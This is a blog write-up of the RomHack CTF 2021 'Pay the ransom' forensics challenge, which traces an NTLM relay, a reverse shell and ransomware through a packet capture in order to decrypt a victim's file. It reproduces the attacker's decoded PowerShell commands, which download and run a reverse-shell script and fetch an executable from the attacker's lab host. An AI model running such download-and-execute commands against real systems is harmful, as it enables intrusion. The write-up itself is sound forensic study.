---
layout: post
title:  "Writeup: RomHack CTF 2021 - Pay the ransom"
#date:   2021-09-21 TBA
permalink: /writeups/romhack-2021-pay-the-ransom
---

# Writeup: RomHack CTF 2021 - Pay the ransom

This is a writeup for the "Pay the ransom" forensics challenge from RomHack CTF
2021 organized by [HackTheBox](https://www.hackthebox.eu).

As the initial setup for the challenge we receive two files, _invoice.pdf.enc_ and
_capture.pcap_, as well as a brief from the victim saying that their files are
encrypted. Unfortunately I did not copy the message before the CTF ended, so it's
gone for good now. The PCAP file is a network traffic capture file and the enc-file
is presumably one of the victim's files in encrypted form, which they said they
urgently needed to be decrypted.

I used Wireshark to browse the PCAP file. What I usually do with PCAP files in
CTF's is to see what are the most used protocols and quickly scan through the
entire thing to get a very rough overview of what has happened. In this case it
looks like there was some HTTP and SMB traffic at the start of the capture,
followed by plenty of plain TCP packets, and ending with a short HTTP interaction.
My initial hunch for what the large plain TCP stream would be was either an
encrypted communications channel, or an encrypted data transfer. Or both.

In the image below we can see that 192.168.1.8 (presumably the victim) is using
WebDAV to communicate with 192.168.1.16, the attacker, which in turn responds with
an NTLM authentication request. I'm not very familiar with the NTLM protocol, but
based on the capture it looks like the attacker is reusing the authentication
process to impersonate as the victim to the SMB service at 192.168.1.11.

[![HTTP-NTLM-SMB]({{site.path_img}}/writeups/romhack2021-ransom-http-ntlm-smb.png)]({{site.path_img}}/writeups/romhack2021-ransom-http-ntlm-smb.png)

If we look at the SMB traffic we see that the attacker has now authenticated as
CORP\fcastle. We also see that it is connecting to the \IPC$ share and using
SVCCTL. I don't know much about the details of how utilities like PsExec do
command execution over SMB, but my guess is it looks something like what we see
in this capture file. Following the TCP stream related to the SMB traffic we can
see that there are PowerShell commands being sent to 192.168.1.11.

[![SMB PowerShell]({{site.path_img}}/writeups/romhack2021-ransom-tcp-stream-smb.png)]({{site.path_img}}/writeups/romhack2021-ransom-tcp-stream-smb.png)

Let's decode that base64-encoded execute.bat:

``` bash
printf "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADYAOgA4ADAAOAAwAC8AcgBlAHYALgBwAHMAMQAnACkAOwAkAHAAYQByAHQAMQA9ACIASABUAEIAewBuADAAdABfAHAANAB5ADEAbgBnACIA" | base64 -d

# Outputs:
# iex (new-object net.webclient).DownloadString('http://192.168.1.16:8080/rev.ps1');$part1="HTB{n0t_p4y1ng"
```

The attacker seems to have upgraded to a reverse shell. We've also got the first
part of the flag: `HTB{n0t_p4y1ng`.

When looking for _rev.ps1_ and the resulting reverse shell, I noticed that the
+/- buttons in the follow-dialogue are a handy way of browsing the TCP streams.
The HTTP request for _rev.ps1_ is in stream 7 and the shell in 8.

[![TCP stream
browsing]({{site.path_img}}/writeups/romhack2021-ransom-browse-stream.png)]({{site.path_img}}/writeups/romhack2021-ransom-browse-stream.png)

The reverse shell was doing some basic enumeration of the system and using
Mimikatz. It also issued the following command:

``` powershell
iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.16:8080/music.exe","C:\Users\Public\Music\music.exe")
```

The brief also mentioned that the victim was listening to music while this
happened. This was pretty much a hint for what to investigate next. I extracted
_music.exe_ and opened it in dotPeek on a Windows VM. As a side note, I use
[Flare VM](https://github.com/mandiant/flare-vm) as my Windows test machine, as
it installs plenty of handy software.

The binary decompiles nicely and reveals a `Reverse_Shell` namespace. Sounds
relevant. There is also a string called `part2` with the value `_th3_r4ns0m_1s`.
No doubt the 2nd part of the flag. Most of the code in the reverse shell is
fairly standard - open a TCP stream to C&C server, encrypt (xor) the data,
receive commands for either RCE or something specific. The most relevant part of
the program can be seen in the image below:

[![Reverse shell encryption
command]({{site.path_img}}/writeups/romhack2021-ransom-revshell.png)]({{site.path_img}}/writeups/romhack2021-ransom-revshell.png)

The function `injran` takes a xor key (`part2` was used as the key) and decrypts
an Assembly object from the attacker's server. I extracted the the _party.b64_
file from the capture and this time used
[CyberChef](https://gchq.github.io/CyberChef/) to decode and decrypt the data,
which turns out to be `PE32+ executable (console) x86-64 Mono/.Net assembly, for
MS Windows`. Decompiling it in dotPeek reveals some key information about how
the encryption was done. The images below are the key takeaways.

[![AES assembly object part
1]({{site.path_img}}/writeups/romhack2021-ransom-aes1.png)]({{site.path_img}}/writeups/romhack2021-ransom-aes1.png)

[![AES assembly object part
2]({{site.path_img}}/writeups/romhack2021-ransom-aes2.png)]({{site.path_img}}/writeups/romhack2021-ransom-aes2.png)

The program creates an AES cipher in CFB mode with blocksize of 128, PKCS7
padding, a PBKDF2 generated key with 50000 iterations with a randomly generated
password, and a randomly generated salt. The salt is prepended to the resulting
encrypted file, and the password is xored with a key (the same xor key). The
encrypted key is then sent to the attacker's server over HTTP to _/post.php_.
Those are all the required parameters for encryption and decryption. Below is an
image of the decrypted PDF.

[![Invoice
PDF]({{site.path_img}}/writeups/romhack2021-ransom-invoice-pdf.png)]({{site.path_img}}/writeups/romhack2021-ransom-invoice-pdf.png)

We've successfully decrypted the PDF and can most likely decrypt any other files
the malware might have encrypted. The full flag read
`HTB{n0t_p4y1ng_th3_r4ns0m_1s_4lw4ys_th3_4nsw3r!!!}`.

## This didn't really happen

What you just read was my recreation of how I would have properly solved this
challenge if I had had more than just 2 hours to solve it. After quickly
scanning through the PCAP for used protocols I just filtered to show HTTP
traffic. I saw the request to _/music.exe_ and thought it looked very
suspicious, so I completely skipped part 1. I spent most of the remaining time
reversing _music.exe_ and the rest. At this point I thought I had all the
necessary pieces: the required parameters to decrypt _invoice.pdf.enc_. I
fumbled around with CyberChef to decrypt the file, and had an almost valid PDF
file from the decryption. However, there were plenty of junk bytes at the start
of the resulting file, and I couldn't get a viewer to open it. It was corrupted.
I didn't know how to extract the IV and wasn't sure about the format of the
encrypted file. Nevertheless, at this point it was 3 minutes past the deadline,
so no points for my team :(.

I spent about another hour trying to get the PDF into a valid file and looking
for the first part of the flag. After missing the deadline I eventually realized
that I didn't need the correct IV since the decrypted file was only missing the
first few bytes of a valid PDF header (looks something along the lines of
`%PDF-17...`). When I noticed that the PDF only had the final part of the flag,
I felt both frustrated and relieved. Frustrated because it still wasn't over,
but relieved that it wasn't just a matter of minutes by which I'd missed the
deadline. No need to wonder about "If I had only done X I could've made it!".

Anyway, the challenge was fun and didn't feel too challenging for me, which was
a welcome change. Sometimes it's nice to do challenges where you pretty much
know where you're going for most of the time. I give this challenge seven and a
half bits out of four possible qubits or whatever...
